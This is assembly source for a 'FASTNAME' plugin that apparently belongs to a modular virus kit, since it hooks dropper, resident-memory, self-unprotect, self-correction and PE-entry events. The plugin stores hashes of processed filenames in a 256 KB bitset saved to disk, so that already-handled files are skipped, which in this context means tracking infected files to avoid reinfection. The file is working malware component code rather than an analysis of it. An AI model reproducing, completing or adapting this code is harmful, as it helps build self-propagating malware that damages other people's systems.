   ; FASTNAME
   ; ~~~~~~~~
   ; - processed filename hash list
   ;
   ; þ for each filename, before accessing file:
   ; þ calculate HASH(filename)
   ; þ if file alredy has been processed - skip it
   ; þ all hashs are stored in the 256k bitset array (2M filenames)
   ; þ hash array is written to disk each HASHBACKUP+1 times

   HASHSIZE                equ     262144  ; do NOT change this value
   HASHBACKUP              equ     1023    ; ==2^n-1

   include                 INCLUDE\consts.inc
   include                 INCLUDE\s2c.inc
   include                 rxio.inc
   include                 k32man.inc
   include                 pentry.inc
   include                 dropper.inc
   include                 memory.inc
   include                 tsr.inc
   include                 util.inc
   include                 unprot.inc
   include                 selfcorr.inc
   include                 maind.inc

   include                 plugin.inc
                           PLUGIN_START    FASTNAME, CODE32, NON_PERMUTABLE

   handleevent:            hookevent EV_PENTRY_START_IN_PE, _init
                           hookevent EV_DROPPER_START_ARC, _init

   ;                       hookevent EV_DROPPER_START_MAIN, _init
                           hookevent EV_MAIND_NOTIFY, _init

                           hookevent EV_TSR_IN_NEW_ADDR, _init_0
                           hookevent EV_FASTNAME_ISNEWFILE, _isnewfile
                           stc
                           retn

   _init:                  pusha
                           event   EV_UNPROT_ME
                           ;; bugfix
                           event   EV_SELFCORR_RUN
                           ;;
                           jmp     _init_both
   _init_0:                pusha
   _init_both:
                           call    allochash
                           call    loadhash
                           popa
                           stc     ; keep event
                           retn

   ; input:  EDX=filename
   ; action: handle event if file is old; kept otherwise

   _isnewfile:             pusha
                           call    getnamehash
                           call    gethashptr
                           inc     dword ptr [edx+4]
                           test    dword ptr [edx+4], HASHBACKUP
                           jnz     __skipsave
                           call    savehash
   __skipsave:             mov     edx, [edx]
                           bts     [edx], eax
                           jc      __badfile
                           popa
                           stc     ; keep event, normal file
                           retn
   __badfile:              popa
                           clc     ; event handled: alredy processed file
                           retn

   gethashptr:             call    __pop_edx
                           dd      ?         ; hash ptr
                           dd      ?         ; count
   __pop_edx:              pop     edx
                           retn

   allochash:              pusha
                           mov     ecx, HASHSIZE
                           event   EV_MEMORY_MALLOC
                           xchg    edx, eax
                           call    gethashptr
                           mov     [edx], eax
                           xor     eax, eax
                           mov     [edx+4], eax
                           popa
                           retn

   savehash:               pusha

                           call    gethashptr
                           mov     edx, [edx]      ; edx=buf
                           mov     ecx, HASHSIZE   ; ecx=bufsize

                           mov     esi, XFILE_1
                           event   EV_UTIL_BSAVE_EX

                           popa
                           retn

   loadhash:               pusha

                           call    gethashptr
                           mov     edx, [edx]      ; edx=buf
                           mov     ecx, HASHSIZE   ; ecx=bufsize

                           mov     esi, XFILE_1
                           event   EV_UTIL_BLOAD_EX

                           popa
                           retn

   ; input:  EDX=filename
   ; output: EAX=21-bit hash

   getnamehash:            pusha
                           xor     ebx, ebx
   __cycle:                mov     al, [edx]
                           inc     edx
                           or      al, al
                           jz      __exit
                           xor     bl, al
                           mov     ah, 8
   __2:                    ror     ebx, 1          ; modified crc32
                           jnc     __3
                           xor     ebx, 0EDB88320h
   __3:                    dec     ah
                           jnz     __2
                           jmp     __cycle
   __exit:                 mov     eax, ebx
                           shr     ebx, 16 ; 11..21 ; (*) depends on hashsize
                           xor     eax, ebx
                           and     eax, 1FFFFFh     ; (*) --//--, ==HASHSIZE*8-1
                           mov     [esp].popa_eax, eax
                           popa
                           retn

                           PLUGIN_END
